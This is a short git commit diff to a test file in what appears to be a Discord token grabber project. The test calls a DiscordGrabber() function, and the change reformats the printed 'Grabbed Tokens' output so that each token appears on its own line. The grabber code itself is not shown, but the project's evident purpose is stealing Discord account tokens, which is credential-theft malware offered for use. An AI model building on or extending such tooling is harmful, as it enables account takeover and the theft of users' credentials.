4b3aeb9136133efc3ff9b70b78e838d1cbabd275
icoegg <225475682+Pieczywosoleckie@users.noreply.github.com>
2026-02-13 09:21:04 +0100

    test1 fix
    Refactor output of grabbed tokens to format them correctly.

--- tests/Test1/main.cpp
+++ tests/Test1/main.cpp
@@ -5,7 +5,17 @@ int main() {
 
 
 	auto tokens = DiscordGrabber();
-	std::cout << "Grabbed Tokens: " << tokens << std::endl;
+
+	std::cout << "Grabbed Tokens: " << std::endl;
+
+	for (size_t a = 0; tokens[a] != '\0'; a++) {
+		if (tokens[a] == ':') {
+			std::cout << "\n";
+		}
+		else {
+			std::cout << tokens[a];
+		}
+	}
 
 	std::cin.get();
 
